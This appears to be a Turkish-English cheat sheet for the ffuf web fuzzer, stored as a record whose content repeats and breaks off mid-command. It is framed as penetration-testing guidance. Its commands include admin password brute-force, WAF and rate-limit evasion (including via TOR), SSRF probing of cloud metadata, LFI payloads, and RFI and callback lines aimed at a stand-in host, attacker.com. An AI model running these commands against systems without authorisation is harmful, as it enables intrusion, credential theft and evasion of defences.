https://target.com/FUZZ -w wordlist.txt -ms 1024-2048\n```\n\n**`-mw <words>`**\n*Match word count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mw 100\n```\n\n**`-ml <lines>`**\n*Match line count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ml 50\n```\n\n**`-mr <regex>`**\n*Match regex pattern.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin|success"\n```\n\n**`-fc <codes>`**\n*Filter status codes.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403\n```\n\n**`-fs <size>`**\n*Filter response size.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n```\n\n**`-fw <words>`**\n*Filter word count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fw 100\n```\n\n**`-fl <lines>`**\n*Filter line count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fl 50\n```\n\n**`-fr <regex>`**\n*Filter regex pattern.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fr "404|not found"\n```\n\n### Redirect Argümanları\n\n**`-r`**\n*Follow redirects.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r\n```\n\n**`-maxredirs <n>`**\n*Maximum redirect count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r -maxredirs 3\n```\n\n### Auto-Calibration\n\n**`-ac`**\n*Auto-calibrate filtering.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n**`-acc <str>`**\n*Custom auto-calibration string.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -acc "CustomNotFoundString"\n```\n\n### Output & Display\n\n**`-s`**\n*Silent mode (no status).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -s\n```\n\n**`-v`**\n*Verbose output.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -v\n```\n\n**`-c`**\n*Colorize output.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -c\n```\n\n**`-e <extensions>`**\n*Extension list (comma-separated).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.txt,.html\n```\n\n### Proxy & Replay\n\n**`-replay-proxy <url>`**\n*Replay matched requests through proxy.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080\n```\n\n**`-x <proxy>`**\n*HTTP/SOCKS proxy.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080\n```\n\n### SSL/TLS\n\n**`-k`**\n*Skip TLS verification.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -k\n```\n\n### Advanced\n\n**`-ic`**\n*Ignore comment lines in wordlist.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ic\n```\n\n**`-ignore-body`**\n*Don't save response body.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ignore-body\n```\n\n## Açıklamalı Komutlar\n\n**Directory fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -c\n```\n*-u: URL with FUZZ keyword, -w: Wordlist, -mc: Match HTTP codes, -c: Color output*\n\n**VHOST fuzzing:**\n```\nffuf -u https://target.com -w subdomains.txt -H "Host: FUZZ.target.com" -fs 1234\n```\n*-H: Custom header with FUZZ, -fs: Filter by size (baseline response)*\n\n**Parameter fuzzing:**\n```\nffuf -u https://target.com/api?id=FUZZ -w numbers.txt -mc 200 -mr "success"\n```\n*-mr: Match regex in response*\n\n**POST login brute-force:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ" -fc 401\n```\n*-X POST: HTTP method, -d: POST data, -fc 401: Filter Unauthorized*\n\n**JSON API fuzzing:**\n```\nffuf -u https://target.com/api -w values.txt -X POST -H "Content-Type: application/json" -d '{"key":"FUZZ"}' -mc 200\n```\n\n**Extension fuzzing:**\n```\nffuf -u https://target.com/adminFUZZ -w extensions.txt -mc 200,301\n```\n*Extension directly after filename*\n\n**With extensions flag:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt -mc 200\n```\n*-e: Append extensions*\n\n**Recursive fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2 -mc 200,301\n```\n*-recursion: Enable, -recursion-depth: Max depth*\n\n**Auto-calibration:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -c\n```\n*-ac: Auto-filter false positives*\n\n**Multi-wordlist clusterbomb:**\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z -mode clusterbomb\n```\n*All combinations of both wordlists*\n\n**Pitchfork mode:**\n```\nffuf -u https://target.com/user/FUZZ/file/FUZ2Z -w users.txt:FUZZ -w files.txt:FUZ2Z -mode pitchfork\n```\n*Parallel iteration (line-by-line)*\n\n**Header fuzzing:**\n```\nffuf -u https://target.com/admin -w tokens.txt -H "Authorization: Bearer FUZZ" -mc 200\n```\n\n**WAF bypass (slow):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5-1 -t 5 -c\n```\n*-rate: 10 req/s, -p: Random delay 0.5-1s, -t: 5 threads*\n\n**Burp proxy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080 -mc 200\n```\n*-x: Proxy all requests through Burp*\n\n**JSON output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json -mc 200\n```\n*-o: Output file, -of json: JSON format*\n\n**Silent mode:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -s -o results.txt\n```\n*-s: No progress output*\n\n## Gerçek Pentest Senaryoları\n\n### Senaryo 1: Gizli Directory Keşfi\n\n```\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403 -c -o discovered-dirs.json -of json\n```\n\n**Admin panels:**\n```\nffuf -u https://target.com/FUZZ -w admin-panels.txt -mc 200,301 -r -c\n```\n\n**Backup files:**\n```\nffuf -u https://target.com/FUZZ -w backups.txt -e .bak,.old,.backup,.zip -mc 200\n```\n\n### Senaryo 2: VHOST / Subdomain Fuzzing\n\n**VHOST discovery:**\n```\nffuf -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.target.com" -fs 1234 -c\n```\n\n**DNS-based:**\n```\nffuf -u https://FUZZ.target.com -w subdomains.txt -mc 200 -c\n```\n\n### Senaryo 3: API Endpoint Fuzzing\n\n**REST API:**\n```\nffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt -mc 200,201,401 -c\n```\n\n**With IDs:**\n```\nffuf -u https://api.target.com/users/FUZZ -w numbers.txt -mc 200 -fs 42\n```\n\n**JSON body:**\n```\nffuf -u https://api.target.com/data -w payloads.txt -X POST -H "Content-Type: application/json" -d '{"param":"FUZZ"}' -mc 200 -mr "success"\n```\n\n### Senaryo 4: Parametre Fuzzing ile RCE Tespiti\n\n**Command injection:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w rce-payloads.txt -mc 200 -mr "root|admin|uid=" -timeout 30\n```\n\n**Time-based:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w time-based.txt -ft 10 -mc 200\n```\n\n### Senaryo 5: JSON Body Fuzzing\n\n**Single param:**\n```\nffuf -u https://api.target.com/action -w payloads.txt -X POST -H "Content-Type: application/json" -d '{"action":"FUZZ"}' -mc 200,500\n```\n\n**Multiple params:**\n```\nffuf -u https://api.target.com/user -w users.txt:FUZZ -w roles.txt:FUZ2Z -X POST -d '{"user":"FUZZ","role":"FUZ2Z"}' -mode clusterbomb -mc 200\n```\n\n### Senaryo 6: Login Brute-Force (WAF Sınırlı)\n\n**Slow brute-force:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ" -fc 401,429 -rate 5 -p 1-2 -t 5 -c\n```\n\n**With session:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: session=abc123" -fc 401 -mc 302\n```\n\n### Senaryo 7: Rate-Limit Bypass Testleri\n\n**Different User-Agents:**\n```\nffuf -u https://target.com/api -w user-agents.txt -H "User-Agent: FUZZ" -mc 200 -fs 42\n```\n\n**IP rotation (X-Forwarded-For):**\n```\nffuf -u https://target.com/api -w ips.txt -H "X-Forwarded-For: FUZZ" -mc 200\n```\n\n### Senaryo 8: SSRF Endpoint Keşfi\n\n**Internal IPs:**\n```\nffuf -u https://target.com/api?url=http://FUZZ -w internal-ips.txt -mc 200 -mr "admin|root|internal"\n```\n\n**Cloud metadata:**\n```\nffuf -u https://target.com/fetch?url=http://FUZZ/latest/meta-data/ -w cloud-endpoints.txt -mc 200\n```\n\n### Senaryo 9: File Upload Bypass Testi\n\n**Extension fuzzing:**\n```\nffuf -u https://target.com/upload -w extensions.txt -X POST -d "file=test.FUZZ" -H "Content-Type: multipart/form-data" -mc 200 -fr "not allowed"\n```\n\n**Content-Type fuzzing:**\n```\nffuf -u https://target.com/upload -w content-types.txt -X POST -H "Content-Type: FUZZ" -mc 200\n```\n\n### Senaryo 10: LFI / RFI Parametre Fuzzing\n\n**LFI:**\n```\nffuf -u https://target.com/?file=FUZZ -w lfi-payloads.txt -mc 200 -mr "root:|passwd"\n```\n\n**Path traversal:**\n```\nffuf -u https://target.com/?file=../../FUZZ -w files.txt -mc 200\n```\n\n**RFI:**\n```\nffuf -u https://target.com/?url=http://attacker.com/FUZZ -w payloads.txt -mc 200\n```\n\n### Senaryo 11: 403 Bypass / Path Traversal\n\n**Bypass techniques:**\n```\nffuf -u https://target.com/adminFUZZ -w bypass-payloads.txt -mc 200,301 -fc 403\n```\n\n**Payloads:**\n```\n/\n//\n/%2f\n/./\n```\n\n## Best Practices\n\n**1. Doğru Concurrency Ayarı:**\n\n**Stealth (low):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 5 -rate 10\n```\n\n**Balanced:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50 -rate 100\n```\n\n**Aggressive:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 200\n```\n\n**2. WAF Signature Tetiklememek:**\n\n**Randomization:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.1-0.5 -H "User-Agent: Mozilla/5.0..."\n```\n\n**Low rate:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -t 5\n```\n\n**3. Response Similarity Analiz:**\n\n**Auto-calibration:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n**Size filtering:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42,1234\n```\n\n**4. Recursive Fuzzing Riskleri:**\n\n**Limit depth:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2\n```\n\n**Monitor progress:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -c -v\n```\n\n**5. Wordlist Optimizasyonu:**\n\n**Start small:**\n```\nffuf -u https://target.com/FUZZ -w common.txt -mc 200,301\n```\n\n**Then expand:**\n```\nffuf -u https://target.com/FUZZ -w big-wordlist.txt -mc 200,301 -ac\n```\n\n**6. Timing Tabanlı Blind Fuzzing:**\n\n**Time threshold:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w payloads.txt -ft 5 -timeout 30\n```\n\n**7. Hedefe Göre Matcher/Filter:**\n\n**Dynamic sites:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -c\n```\n\n**Static sites:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200 -fs 1234\n```\n\n**8. Gerçek Pentest Workflow:**\n\n**1. Initial scan:**\n```\nffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,403 -c\n```\n\n**2. Extension enum:**\n```\nffuf -u https://target.com/FUZZ -w found-dirs.txt -e .php,.html,.txt -mc 200\n```\n\n**3. Recursive:**\n```\nffuf -u https://target.com/interesting-dir/FUZZ -w wordlist.txt -recursion -recursion-depth 2\n```\n\n**4. Parameter fuzzing:**\n```\nffuf -u https://target.com/endpoint?FUZZ=value -w params.txt -mc 200\n```\n\n## Sık Yapılan Hatalar\n\n**1. -mc yerine -fc kullanmak:**\n```\n# YANLIŞ (sadece 404 filtrele)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404\n\n# DOĞRU (200, 301, 302 match)\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302\n```\n\n**2. Çok yüksek concurrency:**\n```\n# YANLIŞ (rate limit / IP ban)\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 500\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50 -rate 100\n```\n\n**3. Yanlış wordlist seçimi:**\n```\n# YANLIŞ (çok büyük, gereksiz)\nffuf -u https://small-app.com/FUZZ -w huge-wordlist.txt\n\n# DOĞRU (kademeli)\nffuf -u https://small-app.com/FUZZ -w common.txt\n```\n\n**4. FUZZ keyword yanlış konumlandırma:**\n```\n# YANLIŞ (FUZZ yerine literal string)\nffuf -u https://target.com/admin -w wordlist.txt\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**5. Redirect takibi kapalı:**\n```\n# YANLIŞ (301/302 manual takip)\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 301\n\n# DOĞRU (follow redirects)\nffuf -u https://target.com/FUZZ -w wordlist.txt -r -mc 200\n```\n\n**6. JSON body FUZZ eksikliği:**\n```\n# YANLIŞ (FUZZ yok)\nffuf -u https://api.target.com -w payloads.txt -X POST -d '{"key":"value"}'\n\n# DOĞRU\nffuf -u https://api.target.com -w payloads.txt -X POST -d '{"key":"FUZZ"}'\n```\n\n**7. Response length vs word count:**\n```\n# YANLIŞ (size yerine word)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fw 100\n\n# DOĞRU (size filtering)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234\n```\n\n**8. Auto-calibration yapmamak:**\n```\n# YANLIŞ (manual filtering)\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n**9. Output kaydetmemek:**\n```\n# YANLIŞ\nffuf -u https://target.com/FUZZ -w huge-wordlist.txt\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w huge-wordlist.txt -o results.json -of json\n```\n\n**10. Extension list yanlış:**\n```\n# YANLIŞ (extension flag kullanmadan)\nffuf -u https://target.com/FUZZ.php -w wordlist.txt\n\n# DOĞRU\nffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt\n```\n\n## Mode Örnekleri\n\n**Clusterbomb (all combinations):**\n```\n# 2 wordlist, her kombinasyon\nffuf -u https://target.com/FUZZ/FUZ2Z -w w1.txt:FUZZ -w w2.txt:FUZ2Z -mode clusterbomb\n```\n\n**Pitchfork (parallel):**\n```\n# 2 wordlist, satır satır\nffuf -u https://target.com/user/FUZZ/file/FUZ2Z -w users.txt:FUZZ -w files.txt:FUZ2Z -mode pitchfork\n```\n\n## Filter & Matcher Kombinasyonları\n\n**Multiple filters:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403 -fs 42,1234 -fw 100\n```\n\n**Multiple matchers:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301 -ms 1000-5000 -mr "success"\n```\n\n## İpuçları\n\n**Quick scan:**\n```\nffuf -u https://target.com/FUZZ -w common.txt -mc 200 -c\n```\n\n**Deep scan:**\n```\nffuf -u https://target.com/FUZZ -w big.txt -recursion -recursion-depth 3 -ac -o deep.json -of json\n```\n\n**API testing:**\n```\nffuf -u https://api.target.com/v1/FUZZ -w api-endpoints.txt -mc 200,201,401 -c -v\n```\n\n**Bypass 403:**\n```\nffuf -u https://target.com/adminFUZZ -w bypass.txt -mc 200 -fc 403\n```\n	# FFUF - Fuzz Faster U Fool\n\n## Temel Kullanım\n\n### Basit Directory Fuzzing\n\n**Directory brute-force:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**Multiple directories:**\n```\nffuf -u https://target.com/FUZZ/admin -w directories.txt\n```\n\n### Basit Parametre Fuzzing\n\n**GET parameter:**\n```\nffuf -u https://target.com/api?param=FUZZ -w values.txt\n```\n\n**Multiple parameters:**\n```\nffuf -u https://target.com/api?user=FUZZ&role=FUZ2Z -w users.txt:FUZZ -w roles.txt:FUZ2Z\n```\n\n### Wordlist Kullanımı\n\n**Single wordlist:**\n```\nffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n```\n\n**Multiple wordlists:**\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z\n```\n\n### Status Code Filtreleme\n\n**Match specific codes:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302\n```\n\n**Filter out codes:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403\n```\n\n### Response Size Filtreleme\n\n**Filter by size:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n```\n\n**Match by size:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ms 1024-2048\n```\n\n### Timeout ve Concurrency\n\n**Set timeout:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -timeout 10\n```\n\n**Concurrency:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50\n```\n\n**Rate limiting:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100\n```\n\n### Redirect Handling\n\n**Follow redirects:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r\n```\n\n**Max redirect depth:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r -maxredirs 3\n```\n\n### Output Kaydetme\n\n**JSON output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json\n```\n\n**CSV output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.csv -of csv\n```\n\n**HTML output:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.html -of html\n```\n\n## İleri Seviye Kullanım\n\n### Recursion\n\n**Recursive fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion\n```\n\n**Recursion depth:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3\n```\n\n**Recursion strategy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-strategy greedy\n```\n\n### Extended Matchers\n\n**Regex matcher:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin|root|success"\n```\n\n**Word count matcher:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mw 100-200\n```\n\n**Line count:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ml 50\n```\n\n**Multiple matchers:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200 -ms 1000-5000 -mr "success"\n```\n\n### Rate Limiting Bypass\n\n**Slow rate:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 10 -p 0.5\n```\n\n**Random delay:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.1-0.5\n```\n\n**Low threads:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 5 -p 1\n```\n\n### Header Fuzzing\n\n**Custom header:**\n```\nffuf -u https://target.com/api -w headers.txt -H "X-Custom: FUZZ"\n```\n\n**Authorization fuzzing:**\n```\nffuf -u https://target.com/api -w tokens.txt -H "Authorization: Bearer FUZZ"\n```\n\n**Multiple headers:**\n```\nffuf -u https://target.com/api -w values.txt -H "X-Header-1: FUZZ" -H "X-Header-2: FUZ2Z" -w values2.txt:FUZ2Z\n```\n\n**User-Agent fuzzing:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -H "User-Agent: FUZZ" -w user-agents.txt:FUZZ\n```\n\n### Subdomain Fuzzing (VHOST)\n\n**VHOST fuzzing:**\n```\nffuf -u https://target.com -w subdomains.txt -H "Host: FUZZ.target.com"\n```\n\n**DNS-based subdomain:**\n```\nffuf -u https://FUZZ.target.com -w subdomains.txt\n```\n\n**VHOST with filtering:**\n```\nffuf -u https://target.com -w subdomains.txt -H "Host: FUZZ.target.com" -fs 1234\n```\n\n### GET/POST/JSON Body Fuzzing\n\n**POST data:**\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "username=admin&password=FUZZ"\n```\n\n**JSON body:**\n```\nffuf -u https://target.com/api -w values.txt -X POST -H "Content-Type: application/json" -d '{"key":"FUZZ"}'\n```\n\n**Multiple JSON params:**\n```\nffuf -u https://target.com/api -w users.txt:FUZZ -w ids.txt:FUZ2Z -X POST -d '{"user":"FUZZ","id":"FUZ2Z"}'\n```\n\n**PUT method:**\n```\nffuf -u https://target.com/api/FUZZ -w ids.txt -X PUT -d "value=test"\n```\n\n### Parameter Pollution Fuzzing\n\n**Multiple same param:**\n```\nffuf -u https://target.com/api?id=1&id=FUZZ -w values.txt\n```\n\n**Parameter injection:**\n```\nffuf -u https://target.com/api?param=value&FUZZ=test -w params.txt\n```\n\n### Blind Fuzzing\n\n**Time-based detection:**\n```\nffuf -u https://target.com/api?cmd=FUZZ -w payloads.txt -timeout 30 -ft 10\n```\n\n**Size variation:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42 -ac\n```\n\n**Auto-calibration:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac\n```\n\n### WAF Detection & Evasion\n\n**Random User-Agent:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -H "User-Agent: Mozilla/5.0..." -replay-proxy http://127.0.0.1:8080\n```\n\n**Case variation:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ac -rate 10\n```\n\n**Encoding:**\n```\nffuf -u https://target.com/%46%55%5a%5a -w wordlist.txt\n```\n\n### Burp Collaborator Benzeri Dış Çağrı Tespiti\n\n**DNS callback:**\n```\nffuf -u https://target.com/api?url=http://FUZZ.burpcollaborator.net -w payloads.txt\n```\n\n**HTTP callback:**\n```\nffuf -u https://target.com/api?callback=http://attacker.com/FUZZ -w ids.txt\n```\n\n### Varying Thread Strategies\n\n**Low threads (stealth):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 5\n```\n\n**High threads (fast):**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 200\n```\n\n**Adaptive threads:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50 -rate 100\n```\n\n### Payload Encoding\n\n**URL encoding:**\n```\nffuf -u https://target.com/api?param=%46%55%5a%5a -w payloads.txt\n```\n\n**Base64:**\n```\n# Pre-encode wordlist\ncat payloads.txt | base64 > encoded.txt\nffuf -u https://target.com/api?data=FUZZ -w encoded.txt\n```\n\n### Multi-Wordlist (Mode)\n\n**Clusterbomb (all combinations):**\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z -mode clusterbomb\n```\n\n**Pitchfork (parallel iteration):**\n```\nffuf -u https://target.com/user/FUZZ/file/FUZ2Z -w users.txt:FUZZ -w files.txt:FUZ2Z -mode pitchfork\n```\n\n### FUZZ Keyword Kullanım Pratikleri\n\n**Path fuzzing:**\n```\nffuf -u https://target.com/FUZZ\n```\n\n**Extension fuzzing:**\n```\nffuf -u https://target.com/adminFUZZ -w extensions.txt\n```\n\n**Multiple keywords:**\n```\nffuf -u https://FUZZ.target.com/FUZ2Z -w subdomains.txt:FUZZ -w paths.txt:FUZ2Z\n```\n\n**Query param:**\n```\nffuf -u https://target.com/?FUZZ=value -w params.txt\n```\n\n### Proxy Kullanımı\n\n**Burp Suite:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080\n```\n\n**SOCKS proxy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x socks5://127.0.0.1:9050\n```\n\n**Replay proxy:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -replay-proxy http://127.0.0.1:8080\n```\n\n**TOR:**\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x socks5://127.0.0.1:9050\n```\n\n## Argument Referansı\n\n### Temel Argümanlar\n\n**`-u <url>`**\n*Hedef URL.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**`-w <wordlist>`**\n*Wordlist dosyası.*\n```\nffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\n```\n\n**`-H <header>`**\n*Custom header.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -H "Authorization: Bearer token"\n```\n\n**`-X <method>`**\n*HTTP method (GET, POST, PUT, DELETE).*\n```\nffuf -u https://target.com/api -w data.txt -X POST\n```\n\n**`-d <data>`**\n*POST data payload.*\n```\nffuf -u https://target.com/login -w passwords.txt -X POST -d "user=admin&pass=FUZZ"\n```\n\n**`-mr <regex>`**\n*Regex matcher.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin|success"\n```\n\n**`-fs <size>`**\n*Filter by response size.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n```\n\n**`-fc <codes>`**\n*Filter by status code.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403\n```\n\n**`-mc <codes>`**\n*Match status code.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301\n```\n\n**`-c`**\n*Colorized output.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -c\n```\n\n**`-t <threads>`**\n*Concurrency (threads).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -t 50\n```\n\n**`-timeout <sec>`**\n*Timeout per request (seconds).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -timeout 10\n```\n\n**`-o <file>`**\n*Output file.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json\n```\n\n**`-of <format>`**\n*Output format (json, csv, html, md, ecsv).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json\n```\n\n**`--json`**\n*JSON output (alias for -of json).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json --json\n```\n\n### Fuzzing Argümanları\n\n**`FUZZ`**\n*Primary fuzzing keyword.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt\n```\n\n**`FUZ2Z, FUZ3Z, etc.`**\n*Multiple fuzzing keywords.*\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z\n```\n\n**`-request <file>`**\n*Raw HTTP request from file.*\n```\nffuf -request request.txt -w wordlist.txt\n```\n\n**`-mode <mode>`**\n*Fuzzing mode (clusterbomb, pitchfork).*\n```\nffuf -u https://target.com/FUZZ/FUZ2Z -w w1.txt:FUZZ -w w2.txt:FUZ2Z -mode clusterbomb\n```\n\n### Performans Argümanları\n\n**`-rate <n>`**\n*Requests per second.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -rate 100\n```\n\n**`-p <seconds>`**\n*Delay between requests (can be range: 0.1-0.5).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -p 0.5\n```\n\n**`-x <proxy>`**\n*Proxy URL.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080\n```\n\n**`--delay <seconds>`**\n*Alias for -p.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt --delay 1\n```\n\n### Recursion Argümanları\n\n**`-recursion`**\n*Enable recursive fuzzing.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion\n```\n\n**`-recursion-depth <n>`**\n*Maximum recursion depth.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2\n```\n\n**`-recursion-strategy <strategy>`**\n*Recursion strategy (default, greedy).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-strategy greedy\n```\n\n### Matchers & Filters\n\n**`-mc <codes>`**\n*Match HTTP status codes.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302\n```\n\n**`-ms <size>`**\n*Match response size (bytes or range).*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ms 1024-2048\n```\n\n**`-mw <words>`**\n*Match word count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mw 100\n```\n\n**`-ml <lines>`**\n*Match line count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -ml 50\n```\n\n**`-mr <regex>`**\n*Match regex pattern.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -mr "admin|success"\n```\n\n**`-fc <codes>`**\n*Filter status codes.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404,403\n```\n\n**`-fs <size>`**\n*Filter response size.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fs 42\n```\n\n**`-fw <words>`**\n*Filter word count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fw 100\n```\n\n**`-fl <lines>`**\n*Filter line count.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fl 50\n```\n\n**`-fr <regex>`**\n*Filter regex pattern.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -fr "404|not found"\n```\n\n### Redirect Argümanları\n\n**`-r`**\n*Follow redirects.*\n```\nffuf -u https://target.com/FUZZ -w wordlist.txt -r\n```\n\n**`-maxredirs <n>`**\n*Maximum redirect count.*\n```\nffuf -u 